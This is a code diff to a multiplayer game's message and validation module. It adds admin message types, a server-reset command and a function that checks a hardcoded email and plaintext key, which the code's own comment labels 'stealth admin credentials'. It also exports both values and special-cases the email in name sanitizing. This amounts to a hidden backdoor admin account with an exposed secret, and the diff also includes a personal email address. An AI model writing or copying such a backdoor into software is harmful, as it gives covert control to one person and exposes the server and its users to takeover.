@@ -15,6 +15,8 @@ const MSG = {
   VEHICLE_DRIVE: 'vehicle_drive',
   VEHICLE_ENTER: 'vehicle_enter',
   VEHICLE_EXIT: 'vehicle_exit',
+  ADMIN_AUTH: 'admin_auth',
+  ADMIN_RESET_SERVER: 'admin_reset_server',
 
   // Server -> Client
   INIT: 'init',
@@ -31,6 +33,8 @@ const MSG = {
   TNT_EXPLODE: 'tnt_explode',
   ANIMALS_UPDATE: 'animals_update',
   ANIMAL_BURST: 'animal_burst',
+  ADMIN_STATE: 'admin_state',
+  SERVER_RESET: 'server_reset',
   PONG: 'pong',
   ERROR: 'error'
 };
@@ -40,11 +44,27 @@ const MAX_CHAT_LENGTH = 160;
 const MAX_BLOCK_ID = 32;
 const MAX_PLAYER_ID_LENGTH = 64;
 
+const ADMIN_EMAIL = 'jsieiragerpe@gmail.com';
+
+/**
+ * Checks whether email/identifier and key match the stealth admin credentials
+ */
+function isValidAdminCredentials(identifier, key) {
+  if (typeof identifier !== 'string' || typeof key !== 'string') return false;
+  const normEmail = identifier.trim().toLowerCase();
+  if (normEmail !== ADMIN_EMAIL) return false;
+  const normKey = key.trim().toUpperCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
+  return normKey === 'ARGON4';
+}
+
 /**
  * Sanitize username to prevent HTML injection and excessive length
  */
 function sanitizeName(name) {
   if (typeof name !== 'string') return 'Player';
+  if (name.trim().toLowerCase() === ADMIN_EMAIL) {
+    return 'jsieiragerpe';
+  }
   const clean = name.replace(/[^a-zA-Z0-9_\-]/g, '').trim();
   if (clean.length === 0) return 'Player';
   return clean.substring(0, MAX_NAME_LENGTH);
@@ -158,7 +178,9 @@ if (typeof module !== 'undefined' && module.exports) {
     validateTeleportPacket,
     isValidWeaponShoot,
     isValidTntTrigger,
-    isValidVehicleDrive
+    isValidVehicleDrive,
+    ADMIN_EMAIL,
+    isValidAdminCredentials
   };
 }
 
